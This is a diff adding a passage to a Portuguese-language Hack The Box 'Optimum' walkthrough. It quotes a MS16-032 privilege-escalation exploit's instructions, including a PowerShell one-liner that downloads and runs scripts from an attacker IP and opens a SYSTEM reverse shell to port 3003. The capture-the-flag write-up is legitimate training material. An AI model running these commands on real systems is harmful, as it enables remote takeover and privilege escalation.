@@ -1414,3 +1414,14 @@ Precisei fazer um upgrade em minha reverse shell anterior e agora tenho uma reve
 ![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/8.jpg)
 
 Foi necessario pq pretendo usar essa exploracao https://gist.github.com/intrd/6dda33f61dca560e6996d01c62203374
+
+De acordo com o que ja falei varias vezes, sempre leia o codigo..
+
+```
+# Follow this cmd to exploit MS16-032 to get admin and run shell.ps1(ATTACHMNT): Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command YOURCOMANDHERE"
+# To get a reverse powershell, serve this ms16_032_intrd_mod.ps1 and Invoke-PowerShellTcp.ps1, and use this download & exec oneliner: IEX (New-Object Net.WebClient).Downlo
+adString('http://10.10.15.169:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('htt
+p://10.10.15.169:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.169 -Port 3003"     
+```
+
+Seguindo essas intrucoes do codigo, vamos tentar obter nossa reverse shell de SYSTEM
